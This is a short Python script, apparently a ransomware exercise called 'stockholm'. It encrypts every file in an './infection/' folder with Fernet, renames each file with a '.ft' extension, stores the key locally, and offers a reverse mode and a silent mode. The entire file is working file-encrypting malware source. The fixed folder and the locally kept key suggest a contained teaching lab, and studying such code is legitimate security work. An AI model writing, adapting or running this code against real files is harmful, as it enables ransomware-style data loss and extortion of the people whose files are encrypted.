import os
import parser
from cryptography.fernet import Fernet

# Global variables
path = "./infection/"

# Functions
def getKey():
    if os.path.isfile("thekey.key"):    # Check if the key exists
        with open("thekey.key", "rb") as thekey:
            key = thekey.read()
    else:
        key = Fernet.generate_key()     # If not, create a new one
        with open("thekey.key", "wb") as theKey:
            theKey.write(key)

    return(key)


def encryptFiles(file, key):
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encrypted = Fernet(key).encrypt(content)

    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)

    os.rename(file, file + ".ft") # Add .ft extension


def reverse(file): 
    with open("thekey.key", "rb") as key:
        secretkey = key.read()

    with open(file, "rb") as thefile:
        content = thefile.read()

    content_decrypted = Fernet(secretkey).decrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_decrypted)

    os.rename(file, os.path.splitext(file)[0]) # Delete .ft extension


def main():
    files = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))] # Save files
    key = getKey()

    for file in files:
        if parser.args.reverse:
            reverse(path + file)
        else:
            if os.path.splitext(file)[len(os.path.splitext(file))-1] == ".ft" or file == "thekey.key" or file == "stockholm.py" or file == "parser.py" or file == "_version.py":
                pass
            else:
                encryptFiles(path + file, key)
                if not parser.args.silent:
                    print("File %s encrypted!" %(file))


if __name__ == '__main__':
    main()